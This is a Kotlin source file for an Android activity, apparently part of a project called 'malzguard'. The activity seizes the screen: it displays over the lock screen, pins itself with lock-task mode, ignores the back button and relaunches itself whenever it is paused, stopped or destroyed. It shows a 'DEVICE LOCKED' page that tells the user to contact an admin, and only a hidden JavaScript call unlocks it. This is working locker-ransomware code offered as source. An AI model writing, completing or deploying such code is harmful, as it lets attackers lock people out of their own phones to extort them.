package com.example.malzguard

import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout

class LockOverlay : Activity() {
    private var locked = true

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        try {
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_FULLSCREEN or
                WindowManager.LayoutParams.FLAG_SECURE or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            )
            try { startLockTask() } catch (e: Exception) {}
            val root = FrameLayout(this)
            val web = WebView(this)
            root.addView(web, FrameLayout.LayoutParams(-1, -1))
            setContentView(root)
            web.settings.javaScriptEnabled = true
            web.webViewClient = WebViewClient()
            web.addJavascriptInterface(Bridge(), "Native")
            val html = intent.getStringExtra("html") ?: DEFAULT_HTML
            web.loadDataWithBaseURL(null, wrapHtml(html), "text/html", "utf-8", null)
        } catch (e: Exception) { finish() }
    }

    private fun wrapHtml(body: String): String {
        if (body.trim().startsWith("<html")) return body
        return """<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:'Courier New',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;overflow:hidden;user-select:none;-webkit-user-select:none}
body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,rgba(255,255,255,.03) 0px,rgba(255,255,255,.03) 1px,transparent 1px,transparent 3px);pointer-events:none;animation:scan 8s linear infinite}
@keyframes scan{to{background-position:0 100px}}
.box{text-align:center;max-width:500px;position:relative;z-index:2}
h1{font-size:28px;letter-spacing:4px;margin-bottom:16px;animation:blink 1.5s infinite}
p{font-size:13px;color:#888;letter-spacing:2px;line-height:1.8}
.lock-icon{font-size:60px;margin-bottom:20px;animation:pulse 2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.5}}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
</style></head><body><div class="box">$body</div></body></html>"""
    }

    inner class Bridge {
        @JavascriptInterface
        fun unlock() { runOnUiThread { try { stopLockTask() } catch (e: Exception) {}; locked = false; finish() } }
    }

    override fun onBackPressed() {}
    override fun onUserLeaveHint() {}
    override fun onPause() { super.onPause(); if (!locked) return; try { (getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).moveTaskToFront(taskId, 0) } catch (e: Exception) {} }
    override fun onStop() {
        super.onStop(); if (!locked) return
        try { val i = Intent(this, LockOverlay::class.java); i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP); i.putExtra("html", intent.getStringExtra("html")); startActivity(i) } catch (e: Exception) {}
    }
    override fun onDestroy() {
        if (locked) { try { val i = Intent(this, LockOverlay::class.java); i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP); i.putExtra("html", intent.getStringExtra("html")); startActivity(i) } catch (e: Exception) {} }
        super.onDestroy()
    }

    companion object {
        const val DEFAULT_HTML = """<div class="lock-icon">🔒</div><h1>DEVICE LOCKED</h1><p>Hubungi admin untuk unlock.</p>"""
    }
}
